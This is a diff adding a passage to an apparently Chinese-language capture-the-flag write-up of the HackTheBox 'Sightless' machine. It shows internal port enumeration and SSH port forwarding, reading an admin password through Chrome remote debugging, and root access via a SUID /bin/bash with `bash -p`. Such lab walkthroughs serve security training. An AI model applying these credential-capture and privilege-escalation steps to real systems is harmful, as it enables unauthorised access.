@@ -186,6 +186,77 @@ udp        0      0 127.0.0.53:53           0.0.0.0:*                           
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
 michael@sightless:~$
 ```
+
+```
+michael@sightless:~$ ss -lntp
+State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
+LISTEN  0        5              127.0.0.1:45217          0.0.0.0:*              
+LISTEN  0        511              0.0.0.0:80             0.0.0.0:*              
+LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
+LISTEN  0        70             127.0.0.1:33060          0.0.0.0:*              
+LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
+LISTEN  0        4096           127.0.0.1:3000           0.0.0.0:*              
+LISTEN  0        151            127.0.0.1:3306           0.0.0.0:*              
+LISTEN  0        10             127.0.0.1:40337          0.0.0.0:*              
+LISTEN  0        511            127.0.0.1:8080           0.0.0.0:*              
+LISTEN  0        4096           127.0.0.1:40805          0.0.0.0:*              
+LISTEN  0        128                    *:21                   *:*              
+LISTEN  0        128                 [::]:22                [::]:*
+
+
+[★]$ ssh michael@sightless.htb -L 40337:127.0.0.1:40337
+michael@sightless.htb's password: 
+Last login: Fri Sep  5 05:22:19 2025 from 10.10.14.80
+michael@sightless:~$
+```
+```
+本地只监听的端口（127.0.0.1）——重点关注
+本地端口	备注
+3000	常见 web 应用或管理面板，HTTP/Node.js 服务可能用
+40337	这个端口特别值得注意，可能是端口转发
+40805	也可能是某个内部服务或后门程序
+45217	高位本地端口，可能是某个后台服务、临时监听或后门
+```
+#### 在终端输入chromium，跳出了浏览器，输入：chrome://inspect
+#### 在Configure：127.0.0.1:40337
+#### 在http://admin.sightless.htb下面,点击inspect->在Network->index.php->Payloa->用户密码
+```
+[★]$ ssh michael@sightless.htb -L 10.10.14.80:8081:127.0.0.1:8080
+michael@sightless.htb's password: 
+Last login: Fri Sep  5 06:39:59 2025 from 10.10.14.80
+michael@sightless:~$
+```
+
+
+```
+michael@sightless:~$ stat /bin/bash
+  File: /bin/bash
+  Size: 1396520   	Blocks: 2728       IO Block: 4096   regular file
+Device: fd00h/64768d	Inode: 700         Links: 1
+Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2025-09-04 15:48:56.379999437 +0000
+Modify: 2024-03-14 11:31:47.000000000 +0000
+Change: 2024-08-09 11:17:02.286877914 +0000
+ Birth: 2024-05-15 03:23:31.234885684 +0000
+```
+
+```
+michael@sightless:~$ stat /bin/bash
+  File: /bin/bash
+  Size: 1396520   	Blocks: 2728       IO Block: 4096   regular file
+Device: fd00h/64768d	Inode: 700         Links: 1
+Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2025-09-05 08:15:01.213417255 +0000
+Modify: 2024-03-14 11:31:47.000000000 +0000
+Change: 2025-09-05 08:10:02.081430310 +0000
+ Birth: 2024-05-15 03:23:31.234885684 +0000
+michael@sightless:~$ bash -p
+bash-5.1# id
+uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael)
+
+
+
+
 #### 这里我们看到端口http是打开的。我们可以使用SSH对其进行端口转发
 ```
 [★]$ ssh michael@sightless.htb -L 10.10.14.80:8083:127.0.0.1:8080  
